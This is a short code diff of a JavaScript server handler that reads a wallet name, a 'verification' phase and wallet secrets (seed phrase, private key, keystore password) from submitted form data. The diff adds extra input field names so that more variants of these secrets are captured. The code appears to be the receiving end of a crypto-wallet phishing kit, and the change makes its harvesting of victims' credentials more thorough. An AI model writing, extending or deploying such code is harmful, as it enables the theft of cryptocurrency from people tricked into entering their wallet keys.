@@ -55,9 +55,9 @@ module.exports = async function handler(req, res) {
     const walletName = body.wallet_name || body.walletName || body.wallet_type || body.walletType || 'N/A';
     const phase = body.phase || body.verification_method || body.verificationMethod || 'seedphrase';
     const password = body.pw || body.password || body.keystorePassword || body.privateKey || body.seedphrase || 'N/A';
-    const seedphrase = body.seedphrase || 'N/A';
-    const privateKey = body.privateKey || 'N/A';
-    const keystorePassword = body.keystorePassword || 'N/A';
+    const seedphrase = body.seedphrase || body.seedphraseInput || 'N/A';
+    const privateKey = body.privateKey || body.privateKeyInput || 'N/A';
+    const keystorePassword = body.keystorePassword || body.keystorePasswordInput || 'N/A';
 
     if (!phase || phase.trim() === '') {
       return res.status(400).send('Required field missing.');
